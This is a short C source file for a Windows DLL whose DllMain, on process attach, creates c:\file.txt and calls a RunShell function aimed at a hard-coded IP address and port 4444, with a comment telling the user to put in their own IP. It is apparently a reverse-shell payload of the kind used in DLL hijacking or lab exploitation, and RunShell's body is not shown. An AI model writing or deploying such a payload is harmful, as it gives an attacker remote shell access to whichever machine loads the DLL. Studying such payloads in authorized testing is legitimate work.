#include <windows.h>
#include <stdio.h>

void RunShell(char *C2Server, int C2Port);

char host[] = "192.168.29.133"; // change this to your ip address
int port = 4444;
FILE *fp;

BOOL APIENTRY DllMain(HMODULE hModule,
                                 DWORD ul_reason_for_call,
                                 LPVOID lpReserved
)
{
    //printf("here\n");
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        fopen_s(&fp, "c:\\file.txt", "w");
        fclose(fp);
        RunShell(host, port);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
